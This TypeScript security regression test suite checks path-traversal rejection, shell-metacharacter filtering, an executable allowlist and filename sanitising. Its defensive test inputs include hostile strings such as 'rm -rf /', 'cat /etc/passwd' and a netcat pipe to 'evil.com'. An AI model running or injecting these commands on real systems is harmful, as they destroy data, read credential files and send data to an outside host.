/**
 * Security regression test — guards against Phase 1 + Phase 5 hardening
 * accidentally getting weakened by future refactors.
 *
 * Covers:
 *   - Path-traversal rejection in `validatePathWithinAllowedRoot`.
 *   - Command-injection rejection in `validateCommandArg` / `validateCommand`.
 *   - Executable allowlist enforcement.
 *   - Shell metacharacter rejection in subprocess helpers.
 */

import * as path from 'path';
import {
  validatePathWithinAllowedRoot,
  validateCommandArg,
  validateCommand,
  sanitizeFilename,
  ToolError,
  ALLOWED_EXECUTABLES,
} from '../src/security.js';
import { runProcess, ensureMatches, ID_ALLOWLIST } from '../src/core/subprocess.js';

describe('security: path traversal', () => {
  const root = path.resolve('/tmp/test-genie-fixture-root');

  it('accepts paths inside the allowed root', () => {
    const result = validatePathWithinAllowedRoot(path.join(root, 'sub', 'file.ts'), root);
    expect(result).toContain('test-genie-fixture-root');
  });

  it('rejects ../ escapes', () => {
    expect(() => validatePathWithinAllowedRoot(path.join(root, '..', 'etc', 'passwd'), root)).toThrow(ToolError);
  });

  it('rejects empty paths', () => {
    expect(() => validatePathWithinAllowedRoot('', root)).toThrow(ToolError);
  });

  it('accepts the root itself', () => {
    const result = validatePathWithinAllowedRoot(root, root);
    expect(result).toBe(root);
  });
});

describe('security: command arg validation', () => {
  it('accepts safe alphanumeric args', () => {
    expect(validateCommandArg('iPhone-15')).toBe('iPhone-15');
    expect(validateCommandArg('com.example.app')).toBe('com.example.app');
  });

  it('rejects shell metacharacters', () => {
    const inputs = [
      'foo; rm -rf /',
      'foo && cat /etc/passwd',
      'foo | nc evil.com 1234',
      'foo `whoami`',
      'foo $(whoami)',
      'foo > /tmp/exfil',
      'foo\nrm -rf /',
    ];
    for (const arg of inputs) {
      expect(() => validateCommandArg(arg)).toThrow(ToolError);
    }
  });
});

describe('security: executable allowlist', () => {
  it('accepts allowlisted executables', () => {
    expect(() => validateCommand('xcrun', ['simctl', 'list'])).not.toThrow();
    expect(() => validateCommand('adb', ['devices'])).not.toThrow();
    expect(() => validateCommand('flutter', ['test'])).not.toThrow();
  });

  it('rejects non-allowlisted executables', () => {
    expect(() => validateCommand('/bin/dangerous-thing', [])).toThrow(ToolError);
    expect(() => validateCommand('rm', ['-rf', '/'])).toThrow(ToolError);
    expect(() => validateCommand('telnet', [])).toThrow(ToolError);
  });

  it('contains the platform compilers added in v3.0.0', () => {
    expect(ALLOWED_EXECUTABLES.has('swiftc')).toBe(true);
    expect(ALLOWED_EXECUTABLES.has('kotlinc')).toBe(true);
    expect(ALLOWED_EXECUTABLES.has('javac')).toBe(true);
  });
});

describe('security: sanitizeFilename', () => {
  it('strips path traversal', () => {
    expect(sanitizeFilename('../../etc/passwd')).not.toContain('..');
  });
  it('strips control characters and quotes', () => {
    expect(sanitizeFilename('weird"name\x00.txt')).not.toContain('\x00');
  });
});

describe('security: runProcess shape', () => {
  it('rejects unsafe executables via runProcess', async () => {
    await expect(
      runProcess('badexec' as any, ['arg']),
    ).rejects.toBeInstanceOf(ToolError);
  });

  it('rejects shell metachars even on allowlisted commands', async () => {
    await expect(
      runProcess('npm', ['install ; rm -rf /']),
    ).rejects.toBeInstanceOf(ToolError);
  });
});

describe('security: ensureMatches', () => {
  it('accepts ID-shaped values', () => {
    expect(ensureMatches('iPhone-15.Pro_2024', ID_ALLOWLIST, 'device')).toBe('iPhone-15.Pro_2024');
  });

  it('rejects ID with shell metacharacters', () => {
    expect(() => ensureMatches('iPhone; rm -rf /', ID_ALLOWLIST, 'device')).toThrow(ToolError);
  });
});
